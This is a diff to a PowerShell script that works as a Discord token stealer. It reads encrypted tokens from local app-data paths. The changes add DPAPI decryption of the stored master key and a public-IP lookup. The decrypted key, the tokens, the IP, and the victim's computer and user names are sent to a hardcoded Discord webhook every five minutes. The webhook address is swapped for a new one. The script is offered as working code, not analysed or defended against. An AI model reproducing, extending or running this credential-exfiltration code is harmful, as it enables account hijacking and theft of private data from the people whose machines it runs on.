@@ -1,4 +1,5 @@
-
+Add-Type -AssemblyName System.Security
+Add-Type -AssemblyName System.Drawing,System.Windows.Forms
 $LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
 $ROAMING = [System.Environment]::GetEnvironmentVariable("APPDATA")
 $PATHS = @{
@@ -28,6 +29,33 @@ $PATHS = @{
 $pattern = @"
 dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*
 "@
+
+function Compress-Bytes {
+    param ([byte[]]$Bytes)
+
+    $ms = New-Object System.IO.MemoryStream
+    $gz = New-Object System.IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Compress)
+    $gz.Write($Bytes, 0, $Bytes.Length)
+    $gz.Close()
+    $compressed = $ms.ToArray()
+    $ms.Dispose()
+    return $compressed
+}
+
+function Unprotect-DPAPI-Key {
+    param(
+        [string]$b64Key
+    )
+
+    $keyBytes = [Convert]::FromBase64String($b64Key)
+    $keyTrimmed = $keyBytes[5..($keyBytes.Length - 1)]
+    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
+        $keyTrimmed, 
+        $null, 
+        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+    )
+    return $decrypted
+}
 
 function Get-Tokens {
     param($path)
@@ -67,7 +95,7 @@ function Get-Key {
     $key = ($jsonContent | ConvertFrom-Json).os_crypt.encrypted_key
     return $key
 }
-
+while ($true) {
 foreach ($platform in $PATHS.Keys) {
     $path = $PATHS[$platform]
     if (!(Test-Path $path)) {
@@ -79,15 +107,25 @@ foreach ($platform in $PATHS.Keys) {
 
         try {
             $key = Get-Key -path $path
-            
-            $body = @{
-                content = "key:$key|token:$token|"
-            } | ConvertTo-Json
-            $webhook = "https://discord.com/api/webhooks/1371450132905721978/q-csTeRzLixW97TxYWPDw7rP2OrcCCirK9d1w-zjhQj4sbjvXQhTzGLc1VGsSnmElPpB#"
-            Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
+            $key = Unprotect-DPAPI-Key -b64Key $key
+            $ip = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.ipify.org?format=json").Content | ConvertFrom-Json
+
+            $message = @"
+{key: "$key",
+token: "$token",
+ip: "$ip"}
+"@
+
+            $payload = @{
+                content = $message
+                username = "$env:COMPUTERNAME | $env:USERNAME"
+            } | ConvertTo-Json -Compress
+            Invoke-WebRequest -Uri "https://discord.com/api/webhooks/1396196434646138941/vOksU__xaH72S3cCcxcauq6A45Yn_d7l-Qcvq6-oWachUkMXZDrku17Oeja4miiyFSNM" -Method Post -Body $payload -ContentType 'application/json'
 
         } catch {
             continue
         }
     }
+}
+Start-Sleep -Seconds 300
 }
